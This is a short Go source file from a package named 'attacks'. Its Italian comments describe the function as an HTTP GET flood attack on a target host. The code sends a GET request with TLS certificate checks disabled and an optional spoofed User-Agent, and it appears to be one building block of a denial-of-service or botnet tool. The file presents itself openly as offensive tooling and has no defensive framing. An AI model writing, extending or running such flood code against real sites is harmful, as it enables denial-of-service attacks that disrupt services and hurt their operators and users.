package attacks

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"strings"
	"time"
)

// SendHTTPGet esegue un attacco HTTP GET flood contro un host
func SendHTTPGet(target string, userAgent string) error {
	// Aggiungiamo il prefisso "http://" se manca
	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
		target = "http://" + target
	}

	// Configura un client HTTP che ignora la validazione del certificato SSL/TLS
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
	}

	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return fmt.Errorf("failed to create HTTP GET request: %v", err)
	}

	// Imposta l'User-Agent se specificato
	if userAgent != "" {
		req.Header.Set("User-Agent", userAgent)
	}

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("HTTP GET request failed: %v", err)
	}
	defer resp.Body.Close()

	// Restituisce nil se tutto è andato a buon fine
	return nil
}
